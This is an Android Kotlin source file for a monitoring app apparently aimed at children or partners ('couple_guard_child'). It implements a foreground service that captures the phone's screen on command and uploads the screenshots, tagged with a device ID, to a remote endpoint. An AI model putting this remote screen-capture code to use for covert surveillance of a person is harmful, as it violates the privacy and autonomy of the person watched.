package com.example.couple_guard_child.services.background

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import com.example.couple_guard_child.UploadHelper
import com.example.couple_guard_child.NativeBridge

class ScreenCaptureForegroundService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_TAKE_SCREENSHOT = "ACTION_TAKE_SCREENSHOT"
        const val ACTION_STOP = "ACTION_STOP"
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_RESULT_INTENT = "extra_result_intent"
        const val CHANNEL_ID = "screen_capture_channel"
        const val NOTIF_ID = 4242

        private var active = false

        fun isActive(): Boolean = active

        fun enqueueAction(context: Context, action: String) {
            val i = Intent(context, ScreenCaptureForegroundService::class.java)
            i.action = action
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(i)
            } else {
                context.startService(i)
            }
        }
    }

    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
    private var resultCode = Activity.RESULT_CANCELED
    private var resultData: Intent? = null

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                resultData = intent.getParcelableExtra(EXTRA_RESULT_INTENT)
                startForeground(NOTIF_ID, buildNotification("Screen capture active"))
                initProjection()
                active = true
            }
            ACTION_TAKE_SCREENSHOT -> {
                if (imageReader == null) {
                    Log.e("SCService", "❌ NOT READY!")
                    return START_NOT_STICKY
                }
                takeScreenshotAndUpload()
            }
            ACTION_STOP -> {
                stopSelf()
            }
            else -> {
                // If no action, just ensure service stays
                startForeground(NOTIF_ID, buildNotification("Screen capture service"))
            }
        }
        return START_STICKY
    }

    private fun buildNotification(text: String): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Child Monitor")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
        return builder.build()
    }

    private fun createNotificationChannel() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Screen Capture", NotificationManager.IMPORTANCE_LOW)
            nm.createNotificationChannel(channel)
        }
    }

    private fun initProjection() {
        if (resultData == null) {
            Log.e("SCService","No projection data; cannot init")
            return
        }
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(resultCode, resultData!!)
        setupVirtualDisplay()
    }

    private fun setupVirtualDisplay() {
        val metrics = DisplayMetrics()
        val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
        wm.defaultDisplay.getRealMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        // 🧠 Tambahkan callback dulu sebelum createVirtualDisplay()
        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() {
                super.onStop()
                Log.w("SCService", "MediaProjection stopped by user or system.")
                try {
                    virtualDisplay?.release()
                    imageReader?.close()
                } catch (e: Exception) {
                    Log.e("SCService", "Error releasing resources: $e")
                } finally {
                    stopSelf()
                }
            }
        }, null)

        // 🔧 Lanjut buat image reader
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        // 🧱 Buat virtual display
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width,
            height,
            density,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )

        Log.i("SCService", "VirtualDisplay created: ${width}x${height}")
    }


    private fun takeScreenshotAndUpload() {
        val reader = imageReader ?: run {
            Log.e("SCService", "ImageReader null")
            return
        }

        // Tunggu image muncul (kadang kosong kalau frame belum siap)
        var image = reader.acquireLatestImage()
        var tries = 0
        while (image == null && tries < 5) {
            tries++
            try { Thread.sleep(200) } catch (_: InterruptedException) {}
            image = reader.acquireLatestImage()
        }

        image ?: run { Log.e("SCService", "No image available"); return }

        try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * image.width

            // ✅ Simpan dulu ukuran sebelum image ditutup
            val width = image.width
            val height = image.height

            val bmp = Bitmap.createBitmap(
                width + rowPadding / pixelStride,
                height,
                Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)
            image.close()

            // ✅ Pakai width & height yang sudah disimpan
            val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)

            // Simpan & upload
            val file = saveBitmapToFile(cropped)
            file?.let {
                val deviceId = NativeBridge.getDeviceId(this) ?: "unknown"
                UploadHelper.uploadScreenshot(deviceId, it.absolutePath)
            }

        } catch (e: Exception) {
            Log.e("SCService", "Screenshot error: $e")
        } finally {
            try { image?.close() } catch (_: Exception) {}
        }
    }


    private fun saveBitmapToFile(bitmap: Bitmap): File? {
        return try {
            val dir = File(getExternalFilesDir(null), "captures")
            if (!dir.exists()) dir.mkdirs()
            val name = "capture_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.jpg"
            val out = File(dir, name)
            val fos = FileOutputStream(out)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, fos)
            fos.flush()
            fos.close()
            out
        } catch (e: Exception) {
            Log.e("SCService","Save error: $e")
            null
        }
    }

    override fun onDestroy() {
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        active = false
        super.onDestroy()
    }
}
